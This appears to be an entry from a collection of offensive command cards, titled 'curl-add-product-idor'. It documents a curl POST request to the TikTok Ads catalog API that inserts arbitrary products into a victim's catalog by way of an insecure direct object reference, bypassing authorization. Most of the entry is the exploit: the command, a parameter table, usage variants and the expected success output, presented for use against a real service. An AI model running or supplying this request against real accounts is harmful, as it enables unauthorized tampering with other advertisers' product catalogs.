---
data: >-
  curl -X POST 'https://ads.tiktok.com/api/catalog/products/' -H 'Authorization:
  Bearer YOUR_ACCESS_TOKEN' -H 'Content-Type: application/json' -d
  '{"product_id": "arbitrary_product_id", "catalog_id": "victim_catalog_id"}'
tags:
  - api
  - exploit
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.327Z'
id: 7dd476e0-df11-4228-8c63-17b6ae0e545a
verified: false
validated: true
submitted: true
---
# curl-add-product-idor

## Command

```bash
curl -X POST 'https://ads.tiktok.com/api/catalog/products/' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"product_id": "arbitrary_product_id", "catalog_id": "victim_catalog_id"}'
```

## Description

This command exploits an IDOR vulnerability in the TikTok Ads API by sending a POST request to add a product to a specified catalog using direct object references, bypassing authorization checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://ads.tiktok.com/api/catalog/products/'` | API endpoint URL | Yes |
| `-H 'Authorization: Bearer YOUR_ACCESS_TOKEN'` | Authentication header with Bearer token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{"product_id": "arbitrary_product_id", "catalog_id": "victim_catalog_id"}'` | JSON payload with arbitrary product and target catalog ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://ads.tiktok.com/api/catalog/products/' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"product_id": "fake_prod_123", "catalog_id": "target_catalog_456"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://ads.tiktok.com/api/catalog/products/' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"product_id": "fake_prod_123", "catalog_id": "target_catalog_456"}'
```

## Expected Output

Successful execution returns a JSON response like {"status": "success", "message": "Product added", "id": "new_product_id"}. Failure may return 403 or 401 if authorization is enforced.

## Related

- [[Related Procedure: Exploit-IDOR-in-TikTok-Ads-API-to-Add-Unauthorized-Products]]
